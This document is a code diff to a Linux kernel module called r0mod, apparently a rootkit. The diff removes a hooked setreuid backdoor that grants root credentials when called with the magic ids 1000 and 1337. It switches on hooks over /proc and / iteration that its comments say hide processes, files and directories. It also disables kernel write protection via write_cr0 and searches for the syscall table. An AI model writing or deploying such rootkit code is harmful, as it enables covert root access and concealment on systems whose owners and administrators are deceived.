@@ -1,13 +1,10 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
-#include <linux/module.h>
 
-#include <linux/cred.h>
+#include <asm/paravirt.h>   // write_cr0
 #include <linux/unistd.h>   // syscalls
 #include <linux/syscalls.h> // syscalls
 #include <linux/capability.h>
-
-#include <asm/paravirt.h>   // write_cr0
 
 #include <r0mod/global.h>
 
@@ -86,24 +83,6 @@ struct
     unsigned char none, flags;
 } __attribute__ ((packed))idt;
 
-asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
-asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
-{
-    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);
-
-    if((ruid == 1000) && (euid == 1337))
-    {
-        printk("[Correct]: You got the correct ids.\n");
-        commit_creds(prepare_kernel_cred(0));
-
-        return new_setreuid(0, 0);
-    }
-
-    return orig_setreuid(ruid, euid);
-}
-
-#if defined(_CONFIG_X86_64_)
-// http://bbs.chinaunix.net/thread-2143235-1-1.html
 unsigned long *find_sct(void)
 {
     char **p;
@@ -127,7 +106,6 @@ unsigned long *find_sct(void)
     else
         return NULL;
 }
-#endif
 
 unsigned long *find_sct_by_addr_scan(void)
 {
@@ -347,12 +325,12 @@ static int __init r0mod_init(void)
     DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);
 
     /* Hook /proc for hiding processes */
-    //proc_iterate = get_vfs_iterate("/proc");
-    //hijack_start(proc_iterate, &n_proc_iterate);
+    proc_iterate = get_vfs_iterate("/proc");
+    hijack_start(proc_iterate, &n_proc_iterate);
 
     /* Hook / for hiding files and directories */
-    //root_iterate = get_vfs_iterate("/");
-    //hijack_start(root_iterate, &n_root_iterate);
+    root_iterate = get_vfs_iterate("/");
+    hijack_start(root_iterate, &n_root_iterate);
 
     write_cr0(read_cr0() & (~0x10000));
 
@@ -363,7 +341,6 @@ static int __init r0mod_init(void)
 
     return 0;
 }
-
 
 static void __exit r0mod_exit(void)
 {
